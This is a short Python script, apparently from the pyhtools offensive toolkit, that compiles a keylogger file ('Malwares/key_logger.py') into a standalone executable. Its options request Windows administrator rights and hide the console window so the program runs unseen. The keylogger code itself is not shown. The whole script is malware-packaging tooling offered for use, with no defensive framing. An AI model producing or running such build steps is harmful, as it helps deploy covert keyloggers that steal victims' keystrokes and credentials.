from pyhtools.evil_files.exec_generator import (
    Compilers, 
    ExecutableGenerator,
)
from os.path import join as path_join


file_path = path_join('.','Malwares', 'key_logger.py')

exe = ExecutableGenerator(
    file_path = file_path, # evil program file path
    output_dir = '.', # output directory
    compiler = Compilers.DEFAULT, # compile using DEFAULT, CLANG, MINGW
    onefile = True, # creates single exe file
    remove_output = True, # deletes all compiled files and retains only exe
    window_uac_perms=True, # asks user for admin rights on windows (only for windows machine)   
    disable_console=True,
)

return_code = exe.generate_executable()
